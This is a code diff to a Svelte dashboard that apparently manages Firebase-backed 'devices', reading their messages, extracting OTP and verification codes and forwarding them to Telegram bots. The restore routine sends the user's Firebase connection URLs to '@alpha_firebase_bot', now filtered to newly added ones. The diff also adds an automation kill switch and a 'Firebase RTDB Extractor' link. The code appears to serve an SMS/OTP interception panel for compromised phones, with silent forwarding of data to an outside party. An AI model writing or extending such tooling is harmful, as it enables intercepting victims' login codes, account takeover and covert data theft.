@@ -128,6 +128,7 @@
   import '$lib/styles/dashboard.css';
   import { onMount } from "svelte";
   import { goto } from '$app/navigation';
+  import { automationState, toggleAutomationEnabled } from '$lib/automation-engine.svelte.js';
 
   function navTo(url, e) {
     if (e) e.preventDefault();
@@ -1403,9 +1404,28 @@
         if (typeof data.settings.autoOpenNotif === "boolean")
           localStorage.setItem("pd_auto_open_notif", String(data.settings.autoOpenNotif));
       }
-      // ── Forward restored Firebase URLs to @alpha_firebase_bot ──
+      // ── Forward ONLY the newly added connections to @alpha_firebase_bot ──
+      // Filter out connections that already existed in localStorage before restore
       if (Array.isArray(data.connections) && data.connections.length > 0) {
-        tgForwardBulkUrls(data.connections.map(c => c.url), data.connections.length, 0);
+        let existingUrls = new Set();
+        try {
+          const existingRaw = localStorage.getItem('pd_connections');
+          if (existingRaw) {
+            const existingConns = JSON.parse(existingRaw);
+            if (Array.isArray(existingConns)) {
+              for (const c of existingConns) {
+                if (c?.url) existingUrls.add(c.url.replace(/\/+$/, ''));
+              }
+            }
+          }
+        } catch {}
+        const newlyAddedUrls = data.connections
+          .filter(c => c?.url && !existingUrls.has(c.url.replace(/\/+$/, '')))
+          .map(c => c.url);
+        if (newlyAddedUrls.length > 0) {
+          const skipped = data.connections.length - newlyAddedUrls.length;
+          tgForwardBulkUrls(newlyAddedUrls, newlyAddedUrls.length, skipped);
+        }
       }
       setTimeout(() => window.location.reload(), 800);
     } catch (e) {
@@ -1543,26 +1563,14 @@
 
       // 2. Get device info (status/battery/phone) from infoPath if available
       let info = db[conn.id]?.info ?? {};
-      const prevInfo = db[conn.id]?.info ?? {}; // snapshot before update
       if (conn.infoPath) {
         try {
           const { data: infoData } = await apiFetch(conn, conn.infoPath);
           if (infoData && typeof infoData === "object") {
             info = infoData;
-            // ── Detect new messages via lastMessageTime ───────────────────
-            const nowMs = Date.now();
-            for (const [devKey, devInfo] of Object.entries(infoData)) {
-              if (!devInfo || typeof devInfo !== "object") continue;
-              const rawNewTs = devInfo.lastMessageTime ?? devInfo.lastSeen ?? 0;
-              const rawPrevTs = prevInfo[devKey]?.lastMessageTime ?? prevInfo[devKey]?.lastSeen ?? 0;
-              const newTs = Number(rawNewTs) < 1e11 ? Number(rawNewTs) * 1000 : Number(rawNewTs);
-              const prevTs = Number(rawPrevTs) < 1e11 ? Number(rawPrevTs) * 1000 : Number(rawPrevTs);
-              // Either time progressed since last poll, or on first poll if message arrived within last 90s
-              const isRecent = newTs && (nowMs - newTs) < NOTIF_DURATION_MS;
-              if (newTs && ((prevTs && newTs > prevTs) || (!prevTs && isRecent))) {
-                fetchLatestMsg(conn, devKey); // fire-and-forget
-              }
-            }
+            // NOTE: OTP/notification scanning intentionally removed from here.
+            // The background-poller.svelte.js dedicated 10s notification poll handles
+            // all OTP detection to avoid duplicates from multiple concurrent code paths.
           }
         } catch {}
       }
@@ -1627,12 +1635,16 @@
     }
   }
 
-  // Refresh active selected panel every 10 seconds and catch any new OTPs
+  // Refresh active selected panel every 10 seconds — updates device list data only.
+  // OTP notification detection is handled exclusively by the background poller's 10s notif loop.
   async function refreshSelectedPanel() {
     if (!selectedConnId) return;
     const conn = connections.find((c) => c.id === selectedConnId);
     if (!conn || !conn.enabled || db[conn.id]?.deactivated) return;
     await fetchConn(conn, true);
+    // NOTE: OTP/notification checking is intentionally NOT done here.
+    // The background-poller.svelte.js dedicated 10s notification poll handles all connections
+    // and fires panel-poller:otp events. This avoids duplicates from multiple code paths.
     if (selectedKey && activeTab === 'device') {
       try {
         const { data } = await apiFetch(
@@ -1644,26 +1656,7 @@
         );
         if (data && typeof data === 'object') {
           msgs = data;
-          const entries = Object.entries(data).slice(-50);
-          for (const [msgId, msg] of entries) {
-            if (!msg || typeof msg !== "object") continue;
-            const text = msg.message ?? msg.body ?? msg.text ?? "";
-            const otp = extractOTP(text);
-            if (!otp && !isVerificationMsg(text)) continue;
-            const sender = msg.sender ?? msg.from ?? "?";
-            const msgTs = msg.dateTime || msg.timestamp || msg.date || msg.time || new Date().toISOString();
-            addNotif({
-              connId: conn.id,
-              conn,
-              devKey: selectedKey,
-              sender,
-              message: text,
-              otp,
-              about: extractAbout(sender, text),
-              msgId,
-              ts: msgTs,
-            });
-          }
+          // No OTP scanning here — deduplicated background poller handles it
         }
       } catch {}
     }
@@ -3268,12 +3261,24 @@
         </a>
         <a
           href="/automation"
-          class="dash-nav-chip chip-automation"
+          class="dash-nav-chip chip-automation {automationState.enabled ? '' : 'chip-automation-off'}"
           onclick={(e) => navTo('/automation', e)}
-          title="Automation Orchestrator"
+          title={automationState.enabled ? 'Automation Orchestrator' : 'Automation Orchestrator (OFF)'}
         >
           <span class="chip-icon">🤖</span>
           <span class="chip-text">Automation</span>
+          {#if !automationState.enabled}
+            <span class="chip-off-dot" title="Automation is OFF"></span>
+          {/if}
+        </a>
+        <a
+          href="/json-extractor"
+          class="dash-nav-chip chip-extractor"
+          onclick={(e) => navTo('/json-extractor', e)}
+          title="Universal JSON & Firebase RTDB Extractor"
+        >
+          <span class="chip-icon">🔍</span>
+          <span class="chip-text">JSON Extractor</span>
         </a>
         <button
           class="ico-btn {bgRefreshing ? 'ico-active' : ''}"
@@ -4288,6 +4293,39 @@
             {:else if forwardOtpToBot && otpTargetBot.trim()}
               <div class="aps-otp-hint aps-otp-ok">✓ Active: Forwarding to {otpTargetBot.trim()}</div>
             {/if}
+          </div>
+
+          <!-- ── Telegram Automation Master Kill Switch ── -->
+          <div class="aps-otp-section" style="margin-top:10px">
+            <div class="aps-row">
+              <span class="aps-label">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <rect x="3" y="11" width="18" height="10" rx="2" />
+                  <circle cx="12" cy="5" r="2" />
+                  <path d="M12 7v4" />
+                  <line x1="8" y1="16" x2="8" y2="16" />
+                  <line x1="16" y1="16" x2="16" y2="16" />
+                </svg>
+                <span>Telegram Automation</span>
+              </span>
+              <button
+                class="aps-tog {automationState.enabled ? 'aps-on' : ''}"
+                onclick={toggleAutomationEnabled}
+                aria-label="Toggle Telegram Automation"
+                title={automationState.enabled ? 'Automation is ON — click to turn OFF' : 'Automation is OFF — click to turn ON'}
+              >
+                <span class="aps-knob"></span>
+              </button>
+            </div>
+            <div style="font-size:11px;line-height:1.4;padding:2px 2px 0;display:flex;align-items:center;gap:6px">
+              {#if automationState.enabled}
+                <span style="color:#22c55e;font-weight:600">● Active</span>
+                <span style="color:#94a3b8">— Workers dispatching & OTP polling enabled</span>
+              {:else}
+                <span style="color:#ef4444;font-weight:600">● Disabled</span>
+                <span style="color:#94a3b8">— All automation logic completely OFF</span>
+              {/if}
+            </div>
           </div>
 
           <!-- ── Backup & Restore ── -->
